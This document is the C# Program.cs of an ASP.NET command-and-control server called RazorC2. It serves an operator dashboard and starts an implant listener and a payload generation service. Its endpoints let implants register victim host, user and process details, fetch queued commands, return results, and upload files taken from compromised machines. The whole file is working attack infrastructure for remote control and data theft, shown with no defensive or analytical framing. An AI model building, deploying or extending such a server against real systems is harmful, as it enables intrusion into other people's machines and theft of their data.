// Program.cs
using RazorC2.Services;
using RazorC2.Hubs; 
using Microsoft.AspNetCore.Mvc; // Required for FromBody, FromRoute etc.
using System.Net; // For HttpStatusCode
using RazorC2.Utilities;
using Microsoft.AspNetCore.SignalR;
using Microsoft.AspNetCore.HttpOverrides;
using Serilog; // <<< ADD Serilog using
using Serilog.Events; // <<< For LogEventLevel

// --- Serilog Configuration (Early Setup) ---
// Configure Serilog basic logging BEFORE building the host
// This captures early startup errors to the console initially
Log.Logger = new LoggerConfiguration()
    .MinimumLevel.Debug() // Capture Debug and higher levels
    .MinimumLevel.Override("Microsoft", LogEventLevel.Information) // Tone down verbose MS logs
    .MinimumLevel.Override("Microsoft.AspNetCore", LogEventLevel.Warning)
    .Enrich.FromLogContext()
    .WriteTo.Console() // Keep console logging during initial setup maybe
    .CreateBootstrapLogger(); // Use temp logger until host builds

try // Wrap host building
{
    Log.Information("Starting RazorC2 Host..."); // Log with Serilog

    var builder = WebApplication.CreateBuilder(args);

    // --- Configure Serilog fully with Host integration ---
    builder.Host.UseSerilog((context, services, configuration) => configuration
        .ReadFrom.Configuration(context.Configuration) // Read config from appsettings.json if needed
        .MinimumLevel.Override("Microsoft", LogEventLevel.Information) // Example override
        .MinimumLevel.Override("Microsoft.AspNetCore", LogEventLevel.Warning)
        .Enrich.FromLogContext()
        .WriteTo.Console() // Keep console sink if desired
        .WriteTo.File( // Configure file sink
            path: Path.Combine(AppContext.BaseDirectory, "logs", "razorc2_log_.txt"), // Output path
            rollingInterval: RollingInterval.Day, // Create a new file daily
            retainedFileCountLimit: 7, // Keep last 7 days of logs
            outputTemplate: "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] {Message:lj}{NewLine}{Exception}", // Log format
            encoding: System.Text.Encoding.UTF8, // Use UTF8 encoding
            restrictedToMinimumLevel: LogEventLevel.Debug // Minimum level for file sink
            )
    );

    builder.WebHost.ConfigureKestrel(options =>
    {
        // UI Listener ONLY (e.g., localhost:5000)
        options.ListenLocalhost(5000);
        // REMOVE the direct Implant Listener configuration from here
        Console.WriteLine($"[*] Main C2 UI/API listening on: http://localhost:5000");
    }).UseUrls("http://localhost:5000"); // ADD THIS to prevent it from also trying to load URLs from appsettings.json/launchsettings.json

    // Add services to the container.
    builder.Services.AddRazorPages();
    builder.Services.AddSignalR();
    builder.Services.AddSingleton<ImplantManagerService>();
    builder.Services.AddSingleton<ProcessManagerService>();
    builder.Services.AddHttpClient();

    builder.Services.Configure<ForwardedHeadersOptions>(options =>
    {
        options.ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto; // **IMPORTANT Security**: Only trust headers from known proxies.
        options.KnownNetworks.Clear();
        options.KnownProxies.Clear();
        Console.WriteLine("[Startup] Configured Forwarded Headers middleware.");
    });

    var app = builder.Build();

    app.UseForwardedHeaders();
    var processManager = app.Services.GetRequiredService<ProcessManagerService>();
    processManager.StartProcess(ManagedProcessType.ImplantListener); // Start the listener process
    processManager.StartProcess(ManagedProcessType.PayloadGenerationService); // Start the payload generation service
    //processManager.StartProcess(ManagedProcessType.HttpFileServer); // On default: do not start HTTP File Server

    app.UseStaticFiles(); // Enable serving files from wwwroot (for CSS, JS)
    app.UseRouting();

    // Map SignalR Hub Endpoint FIRST (or ensure routing is set up correctly)
    app.MapHub<DashboardHub>("/dashboardHub");

    // Define a prefix for internal API calls from the listener
    const string InternalApiPrefix = "/razor-int";

    // --- UI API START ---
    // Endpoint for the UI to fetch implant data
    app.MapGet("/api/ui/implants", (ImplantManagerService manager) =>
    {
        try
        {
            var implants = manager.GetAllImplants();
            return Results.Ok(implants);
        }
        catch (Exception ex)
        {
            manager.Log($"[/api/ui/implants] ERROR fetching implants: {ex.Message}");
            return Results.Problem("Error retrieving implant data.");
        }
    });

    app.MapGet("/api/ui/logs", (ImplantManagerService manager) =>
    {
        try
        {
            var logs = manager.GetLogMessages();
            return Results.Ok(logs);
        }
        catch (Exception ex)
        {
            // Avoid recursive logging if Log itself fails catastrophically
            Console.WriteLine($"[/api/ui/logs] CRITICAL ERROR fetching logs: {ex.Message}");
            return Results.Problem("Error retrieving log data.");
        }
    });

    // Endpoint for the UI to fetch command history for a specific implant
    app.MapGet("/api/ui/implants/{implantId}/history", (
        [FromRoute] string implantId,
        ImplantManagerService manager) =>
    {
        try
        {
            // Check if implant exists first (provides better 404 context)
            var implantExists = manager.GetImplant(implantId) != null;
            var history = manager.GetCommandHistory(implantId); // Get history regardless

            if (!implantExists && !history.Any())
            {
                // Only return 404 if implant truly never existed or was cleaned up
                // and has no residual history
                manager.Log($"[/api/ui/history] History requested for non-existent implant ID: {HashHelper.ShortenHash(implantId)}");
                return Results.NotFound(new { message = "Implant not found." });
            }

            // Otherwise, return the history (could be empty for a valid, new implant)
            return Results.Ok(history);
        }
        catch (Exception ex)
        {
            manager.Log($"[/api/ui/history] ERROR fetching history for {HashHelper.ShortenHash(implantId)}: {ex.Message}");
            return Results.Problem($"Error retrieving command history for implant {implantId}.");
        }
    });

    app.MapDelete("/api/ui/implants/{implantId}", (
        [FromRoute] string implantId,
        ImplantManagerService manager,
        ILogger<Program> logger) => // Inject logger if needed
    {
        logger.LogInformation($"API request to delete implant: {HashHelper.ShortenHash(implantId)}");
        bool success = manager.RemoveImplant(implantId);
        if (success)
        {
            // Return 204 No Content on successful deletion
            return Results.NoContent();
        }
        else
        {
            // Return 404 Not Found if implant didn't exist
            return Results.NotFound(new { message = "Implant not found." });
        }
    });

    // --- UI API END ---

    // --- NEW: Internal API Endpoints for the Listener Process ---
    // These mirror the paths the implant *thinks* it's calling, but under the internal prefix

    app.MapPost($"{InternalApiPrefix}/api/implant/hello", async (
        HttpContext context,
        [FromBody] ImplantRegistrationInfo? regInfo, // Make nullable for better error check
        [FromHeader(Name = "X-Implant-ID")] string? implantIdHeader,
        ImplantManagerService manager,
        ILogger<Program> logger) =>
        {
            string? remoteIp = context.Connection.RemoteIpAddress?.ToString();
            logger.LogInformation($"[/hello] Connection RemoteIpAddress after UseForwardedHeaders: {remoteIp}");

            if (regInfo == null)
            {
                manager.Log($"[Internal API] ERROR: Failed to deserialize request body or body was null.");
                // Return BadRequest for invalid input
                return Results.BadRequest(new { Message = "Invalid or missing request body." });
            }

            manager.Log($"[Internal API] Deserialized Body: Host={regInfo.Hostname}, User={regInfo.Username}, Proc={regInfo.ProcessName}, PID={regInfo.ProcessId}");

            try
            {
                var implant = manager.RegisterOrUpdateImplant(implantIdHeader, remoteIp, regInfo);
                if (implant == null || string.IsNullOrEmpty(implant.Id))
                {
                    manager.Log($"[Internal API] ERROR: ImplantManagerService returned null or empty ID after registration/update attempt.");
                    // Return a server error if the service failed internally
                    return Results.Problem("Failed to register or update implant information on the server.");
                }

                return Results.Ok(new { ImplantId = implant.Id });
            }
            catch (Exception ex)
            {
                // Log the full exception for debugging
                manager.Log($"[Internal API] CRITICAL EXCEPTION during registration/update: {ex.ToString()}");
                // Return a generic server error to the client
                return Results.Problem($"Internal server error during registration: {ex.Message}");
            }
        });

    app.MapGet($"{InternalApiPrefix}/api/implant/{{implantId}}/tasks", (
        [FromRoute] string implantId,
        ImplantManagerService manager, IHubContext<DashboardHub> hubContext) =>
    {
        var implant = manager.GetImplant(implantId);
        if (implant == null)
        {
            manager.Log($"[/api/implant/tasks] Task request from unknown/disconnected implant ID: {HashHelper.ShortenHash(implantId)}");
            return Results.NotFound(new { Message = "Implant not registered or disconnected." });
        }

        var previousLastSeen = implant.LastSeen; // Store previous time
        implant.LastSeen = DateTime.UtcNow;
        //manager.Log($"[/api/implant/tasks] Task check-in from implant {implantId}"); // Turned off - use only for Debug if implants misbehave
        _ = Task.Run(async () =>
        {
            try
            {
                var implants = manager.GetAllImplants(); // Get the updated list
                // Optional: Log only if time actually changed significantly if needed
                // manager.Log($"[Task Check-in] Broadcasting list update for {HashHelper.ShortenHash(implantId)}");
                await hubContext.Clients.All.SendAsync("UpdateImplantList", implants);
            }
            catch (Exception ex)
            {
                manager.Log($"[ERROR] Failed broadcasting list update from /tasks endpoint: {ex.Message}");
            }
        });

        var command = manager.GetPendingCommand(implantId);
        if (command != null)
        {
            manager.Log($"[/api/implant/tasks] Sending task {HashHelper.ShortenHash(command.CommandId)} ('{command.CommandText}') to implant {HashHelper.ShortenHash(implantId)}");
            return Results.Ok(command); // Send one command
        }
        else
        {
            //manager.Log($"[/api/implant/tasks] No tasks pending for implant {implantId}"); // This IS too noisy
            return Results.NoContent(); // No tasks currently available (HTTP 204)
        }
    });

    // Endpoint for implant to send back results
    app.MapPost($"{InternalApiPrefix}/api/implant/{{implantId}}/results", async (
        [FromRoute] string implantId,
        [FromBody] RazorC2.Models.CommandResult? result, // Make nullable for check
        ImplantManagerService manager,
        HttpContext context) => // Context not strictly needed now, but keep for consistency
    {
        var implant = manager.GetImplant(implantId);
        if (implant == null)
        {
            manager.Log($"[/api/implant/results] Result received from unknown/disconnected implant ID: {HashHelper.ShortenHash(implantId)}");
            return Results.NotFound(new { Message = "Implant not registered or disconnected." });
        }

        // Update last seen on result submission
        implant.LastSeen = DateTime.UtcNow;

        if (result == null || string.IsNullOrEmpty(result.CommandId))
        {
            manager.Log($"[/api/implant/results] Received invalid result from {HashHelper.ShortenHash(implantId)}: Missing result body or CommandId.");
            return Results.BadRequest(new { Message = "Invalid result format: Missing CommandId or result body." });
        }

        manager.RecordCommandResult(implantId, result); // Service handles logging internally now

        return Results.Ok(); // Acknowledge receipt
    });



    // Endpoint for IMPLANT to UPLOAD files TO the C2 (used by 'download' command)
    app.MapPost($"{InternalApiPrefix}/api/implant/{{implantId}}/uploadfile", async (
        [FromRoute] string implantId,
        [FromQuery] string? filename, // Get filename from query string
        HttpContext context,          // Access raw request body
        ImplantManagerService manager,
        ILogger<Program> logger) =>     // Inject logger
    {
        var implant = manager.GetImplant(implantId);
        if (implant == null)
        {
            logger.LogWarning("[UploadFile] Upload attempt from unknown/disconnected implant ID: {ImplantId}", implantId);
            // Return Forbidden or NotFound - Forbidden might be slightly better semantically
            return Results.StatusCode((int)HttpStatusCode.Forbidden); // 403
        }

        // --- Input Validation ---
        if (string.IsNullOrWhiteSpace(filename))
        {
            logger.LogWarning("[UploadFile] Implant {ImplantId} upload rejected: Missing filename in query string.", implantId);
            return Results.BadRequest("Filename query parameter is required.");
        }

        // --- Security: Sanitize the filename ---
        // 1. Remove any path information (MOST IMPORTANT)
        var safeFileName = Path.GetFileName(filename);
        // 2. Check for invalid characters
        if (string.IsNullOrWhiteSpace(safeFileName) || safeFileName.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
        {
            logger.LogWarning("[UploadFile] Implant {ImplantId} upload rejected: Invalid filename provided ('{OriginalFilename}').", implantId, filename);
            return Results.BadRequest("Invalid filename format.");
        }
        // 3. Optional: Prevent overwriting critical files or using tricky names
        if (safeFileName.StartsWith(".") || safeFileName.ToLowerInvariant() == "..") // Path.GetFileName should handle '..', but belt-and-suspenders
        {
            logger.LogWarning("[UploadFile] Implant {ImplantId} upload rejected: Potentially unsafe filename ('{SafeFilename}').", implantId, safeFileName);
            return Results.BadRequest("Filename is potentially unsafe.");
        }
        // --- End Security ---


        // Define the target directory (relative to the C2 server's running location)
        var downloadDir = Path.Combine(Directory.GetCurrentDirectory(), "download"); // Changed from "upload_files" to "download" as requested
        try
        {
            // Ensure the directory exists
            Directory.CreateDirectory(downloadDir);

            // Construct the full path for saving the file
            var filePath = Path.Combine(downloadDir, safeFileName);

            // Consider handling file overwrites if necessary (e.g., add timestamp, check existence)
            // For now, it will overwrite if the file exists.

            logger.LogInformation("[UploadFile] Receiving file '{SafeFilename}' from implant {ImplantId} to '{FilePath}'.", safeFileName, implantId, filePath);
            manager.Log($"Receiving file '{safeFileName}' from implant {HashHelper.ShortenHash(implantId)}."); // Also log via manager

            // Read directly from the request body stream and write to the file stream
            // This is efficient for large files as it avoids loading the whole thing into memory.
            await using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                // Copy the request body stream directly to the file stream
                await context.Request.Body.CopyToAsync(fileStream);
            }

            logger.LogInformation("[UploadFile] Successfully saved file '{SafeFilename}' from implant {ImplantId}.", safeFileName, implantId);
            manager.Log($"Successfully saved '{safeFileName}' from {HashHelper.ShortenHash(implantId)} to server download directory.");

            // Send back OK (200) to the implant to confirm receipt
            return Results.Ok();
        }
        catch (Exception ex)
        {
            logger.LogError(ex, "[UploadFile] Error saving file '{SafeFilename}' from implant {ImplantId}: {ErrorMessage}", safeFileName, implantId, ex.Message);
            manager.Log($"ERROR saving file '{safeFileName}' from {HashHelper.ShortenHash(implantId)}: {ex.Message}");
            // Return a server error status code to the implant
            return Results.Problem($"Internal server error while saving file: {ex.Message}");
        }
    });

    // --- Razor Pages Endpoints (for the UI) ---
    app.MapRazorPages();
    // Start the web server
    app.Run();
}
catch (Exception ex)
{
    Log.Fatal(ex, "RazorC2 Host terminated unexpectedly"); // Log fatal errors
}
finally
{
    Log.Information("Shutting down RazorC2 Host.");
    Log.CloseAndFlush(); // Ensure logs are flushed on exit
}